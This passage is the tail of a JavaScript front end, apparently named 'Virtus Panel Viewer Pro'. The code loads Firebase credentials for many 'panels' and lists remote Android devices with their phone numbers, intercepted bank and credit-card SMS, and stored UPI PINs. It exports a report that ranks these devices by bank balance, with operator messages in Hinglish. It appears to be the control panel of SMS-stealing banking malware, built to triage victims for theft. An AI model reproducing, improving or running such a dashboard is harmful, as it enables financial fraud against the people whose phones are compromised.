  }

  const smsList = list;
  const title = modalTab === 'balance' ? `💰 BALANCE · ${dayLabel}` : `🏦 BANK SMS · ${dayLabel}`;
  let html = dayRow + tabs + `<div class="sec-title">${title} · ${smsList.length} SMS · RECENT UPAR</div>`;

  for (let i = 0; i < smsList.length; i++) {
    const m = smsList[i];
    const showAmt = m.avlAmount || m.txnAmount || m.sortAmount;
    const cls = m.isCard ? 'card-sms' : 'avl';
    const typeCls = m.isCard ? 'card' : (m.avlAmount > 0 ? 'avl' : (/debited?|sent|paid/i.test(m.text) ? 'deb' : 'cred'));
    const amtCls = m.isCard ? '' : (m.avlAmount > 0 ? 'gold' : (/debited?|sent|paid/i.test(m.text) ? 'red' : 'green'));
    html += `<div class="sms-card ${cls}">
      <div class="sms-type ${typeCls}">${smsLabel(m)}</div>
      ${showAmt ? `<div class="sms-amt ${amtCls || 'gold'}">${fmtBal(showAmt) || '—'}</div>` : ''}
      <div class="sms-body">${esc(m.text)}</div>
      <div class="sms-meta">${esc(m.sender)} · ${esc(m.time)}</div>
    </div>`;
  }
  return html;
}

function showModal(d, force = false) {
  if (!modalIsOpen || modalClosing || openModalIdx !== d._idx) return;

  document.getElementById('mTitle').textContent = d.name;
  const latestBal = getLatestBalanceInDays(d.bankSms || [], modalDays);
  const list = getModalSmsList(d);
  const dayLabel = DAY_FILTERS.find(x => x.days === modalDays)?.label || 'All Time';
  document.getElementById('mSub').textContent = `${d.status ? '🟢 Online' : '⚫ Offline'} · ${fmtPhone(d.phone)}${latestBal ? ' · Bal ' + fmtBal(latestBal) : ''} · ${list.length} SMS (${dayLabel})`;
  updateModalFirebase(d);

  const html = buildModalHtml(d);
  if (!force && html === lastModalHtml) return;
  lastModalHtml = html;
  document.getElementById('mBody').innerHTML = html;
}

function closeModal(e) {
  if (e) { e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation?.(); }
  if (modalClosing) return;
  if (!modalIsOpen) return;

  modalClosing = true;
  modalIsOpen = false;
  openModalIdx = null;
  lastModalHtml = '';

  const ov = document.getElementById('overlay');
  const body = document.getElementById('mBody');
  ov.classList.remove('open');
  ov.classList.add('hidden');
  body.innerHTML = '';
  document.getElementById('mFirebase').innerHTML = '';
  document.getElementById('modalBox').style.transform = '';

  unlockBodyScroll();

  if (modalCloseTimer) clearTimeout(modalCloseTimer);
  modalCloseTimer = setTimeout(() => {
    modalClosing = false;
    modalCloseTimer = null;
  }, 100);
}

/** Bot jaisa result TXT — High Balance upar */
function exportTxt(auto = false) {
  if (!allDevices.length) {
    setStatus('Pehle Fetch Live karo', 'err');
    return;
  }

  const sorted = [...allDevices]
    .filter(d => d.maxBalance > 0 || (d.bankSms && d.bankSms.length))
    .sort((a, b) => b.maxBalance - a.maxBalance || (b.status - a.status));

  if (!sorted.length) {
    setStatus('Abhi koi bank balance nahi mila — thoda wait karke dubara try karo', 'err');
    return;
  }

  const online = allDevices.filter(d => d.status).length;
  const ts = new Date().toLocaleString('en-IN');
  const lines = [
    '═'.repeat(50),
    '✅ VIRTUS PANEL SEARCH',
    `📊 High → Low | ${ts}`,
    `📦 Devices: ${allDevices.length} | Online: ${online} | With Balance: ${sorted.filter(d=>d.maxBalance>0).length}`,
    '═'.repeat(50),
    ''
  ];

  sorted.forEach((d, i) => {
    const bal = d.maxBalance ? fmtBal(d.maxBalance) : '—';
    lines.push(`#${i + 1} | ${bal} | ${d.status ? '🟢 Online' : '⚫ Offline'} | ${d.name}`);
    lines.push(`Device ID: ${d.id}`);
    lines.push(`Phone: ${fmtPhone(d.phone)} | Battery: ${d.battery} | Android: ${d.android}`);
    lines.push(`Panel: ${d.panelName}`);
    lines.push(`FB: ${d.panelUrl}`);
    if (d.upipin) lines.push(`PIN: ${d.upipin}`);
    lines.push('');

    if (d.bankSms && d.bankSms.length) {
      lines.push('── Bank SMS (Recent → Old) ──');
      [...d.bankSms].sort(sortByRecent).forEach(m => {
        const amt = m.avlAmount || m.txnAmount;
        lines.push(`[${fmtBal(amt)}] ${m.sender} | ${m.time}`);
        lines.push(m.text);
        lines.push('');
      });
    }
    if (d.creditCardSms && d.creditCardSms.length) {
      lines.push('── Credit Card SMS (Recent → Old) ──');
      [...d.creditCardSms].sort(sortByRecent).forEach(m => {
        const amt = m.txnAmount || m.sortAmount;
        lines.push(`[💳 ${fmtBal(amt)}] ${m.sender} | ${m.time}`);
        lines.push(m.text);
        lines.push('');
      });
    } else if (d.maxBalance > 0 && !(d.bankSms && d.bankSms.length)) {
      lines.push(`Avl Balance: ${bal}`);
      lines.push('');
    }
    lines.push('-'.repeat(40));
    lines.push('');
  });

  lines.push('═'.repeat(50));
  lines.push(`Total: ${sorted.length} | Virtus Panel Viewer Pro`);
  lines.push('═'.repeat(50));

  const blob = new Blob([lines.join('\n')], { type: 'text/plain;charset=utf-8' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `high_balance_${Date.now()}.txt`;
  a.click();
  URL.revokeObjectURL(a.href);

  setStatus(`📥 TXT downloaded! ${sorted.length} devices · High balance upar`, 'ok');
  toast(auto ? 'Auto TXT download ho gaya!' : 'TXT download!');
}
function setStatus(msg, cls) {
  const el = document.getElementById('status');
  el.textContent = msg;
  el.className = 'status' + (cls ? ' ' + cls : '');
}
function toast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg; t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2000);
}

document.getElementById('fileInput').addEventListener('change', e => {
  if (!e.target.files[0]) return;
  const r = new FileReader();
  r.onload = ev => {
    panels = parseTxtCredentials(ev.target.result);
    document.getElementById('panelCount').textContent = panels.length + ' panels';
    if (!panels.length) { setStatus('Valid Firebase + Key nahi mila', 'err'); return; }
    setStatus(`✅ ${panels.length} panels ready`, 'ok');
    toast(panels.length + ' panels loaded');
    allDevices = []; render();
  };
  r.readAsText(e.target.files[0]);
});

document.getElementById('fetchBtn').addEventListener('click', () => fetchAllPanels());
document.getElementById('exportBtn').addEventListener('click', () => exportTxt(false));
document.getElementById('refreshBtn').addEventListener('click', () => fetchAllPanels(true));
document.getElementById('searchBox').addEventListener('input', e => { searchQuery = e.target.value; render(); });

document.querySelectorAll('[data-filter]').forEach(b => b.addEventListener('click', () => {
  const f = b.dataset.filter;
  if (activeFilters.has(f)) {
    activeFilters.delete(f);
  } else {
    if (f === 'online') activeFilters.delete('offline');
    if (f === 'offline') activeFilters.delete('online');
    if (f === 'pin') activeFilters.delete('nopin');
    if (f === 'nopin') activeFilters.delete('pin');
    activeFilters.add(f);
  }
  if (smsFetchActive && (smsRunning || smsQueue.length)) {
    pauseSmsFetch();
    smsQueue = [];
  }
  syncFilterPills();
  reapplyTierToLoaded();
  lastRenderSig = '';
  render();
  pruneSmsQueue();
  updateFetchProgress();
}));
document.querySelectorAll('[data-sort]').forEach(b => b.addEventListener('click', () => {
  document.querySelectorAll('[data-sort]').forEach(x => x.classList.remove('sort-on', 'medium-on', 'boom-on'));
  b.classList.add('sort-on');
  if (b.dataset.sort === 'balance_medium') b.classList.add('medium-on');
  if (b.dataset.sort === 'balance_boom') b.classList.add('boom-on');
  currentSort = b.dataset.sort;
  reapplyTierToLoaded();
  updateFilterBar();
  lastRenderSig = '';
  render();
  pruneSmsQueue();
  if (smsFetchActive && (smsRunning || smsQueue.length)) {
    pauseSmsFetch();
    smsQueue = [];
  }
  updateFetchProgress();
}));
document.getElementById('smsStartBtn').addEventListener('click', () => startSmsFetch());
document.getElementById('smsStopBtn').addEventListener('click', () => pauseSmsFetch());

document.getElementById('grid').addEventListener('click', e => {
  const starBtn = e.target.closest('[data-star]');
  if (starBtn) {
    e.stopPropagation();
    const id = starBtn.dataset.star;
    if (starred.has(id)) starred.delete(id); else starred.add(id);
    starBtn.classList.toggle('on');
    return;
  }
  const infoBtn = e.target.closest('[data-open]');
  if (infoBtn) {
    e.stopPropagation();
    openDev(Number(infoBtn.dataset.open));
    return;
  }
  const row = e.target.closest('.drow[data-idx]');
  if (!row || modalIsOpen || modalClosing) return;
  openDev(Number(row.dataset.idx));
});

document.getElementById('mBody').addEventListener('click', e => {
  const dayBtn = e.target.closest('[data-mdays]');
  if (dayBtn && modalIsOpen && !modalClosing) {
    const days = Number(dayBtn.dataset.mdays);
    if (days === modalDays) return;
    modalDays = days;
    lastModalHtml = '';
    const d = allDevices[openModalIdx];
    if (d) showModal(d, true);
    return;
  }
  const tab = e.target.closest('[data-mtab]');
  if (!tab || !modalIsOpen || modalClosing) return;
  const next = tab.dataset.mtab;
  if (next === modalTab) return;
  modalTab = next;
  lastModalHtml = '';
  const d = allDevices[openModalIdx];
  if (d) showModal(d, true);
});

// Modal close — instant, Telegram-safe
window.__closePanelModal = function(e) {
  if (e) { e.preventDefault(); e.stopPropagation(); }
  closeModal(e);
  return false;
};

const closeBtn = document.getElementById('modalCloseBtn');
const overlay = document.getElementById('overlay');
const modalBackdrop = document.getElementById('modalBackdrop');
const modalBox = document.getElementById('modalBox');
const modalDrag = overlay.querySelector('.modal-drag');

closeBtn.onclick = window.__closePanelModal;
closeBtn.addEventListener('touchend', e => { closeModal(e); }, { passive: true });
modalBackdrop.addEventListener('click', closeModal);
modalBackdrop.addEventListener('touchend', e => { closeModal(e); }, { passive: true });

// Swipe down to close
let dragStartY = 0, dragCurrentY = 0, dragging = false;
modalDrag.addEventListener('pointerdown', e => {
  dragStartY = e.clientY;
  dragCurrentY = e.clientY;
  dragging = true;
  modalDrag.setPointerCapture(e.pointerId);
});
modalDrag.addEventListener('pointermove', e => {
  if (!dragging) return;
  dragCurrentY = e.clientY;
  const dy = Math.max(0, dragCurrentY - dragStartY);
  modalBox.style.transform = dy ? `translateY(${dy}px)` : '';
});
function endDrag(e) {
  if (!dragging) return;
  dragging = false;
  const dy = dragCurrentY - dragStartY;
  modalBox.style.transform = '';
  try { modalDrag.releasePointerCapture(e.pointerId); } catch {}
  if (dy > 60) closeModal();
}
modalDrag.addEventListener('pointerup', endDrag);
modalDrag.addEventListener('pointercancel', endDrag);

document.addEventListener('keydown', e => {
  if (e.key === 'Escape' && modalIsOpen && !modalClosing) closeModal();
});

render();
</script>
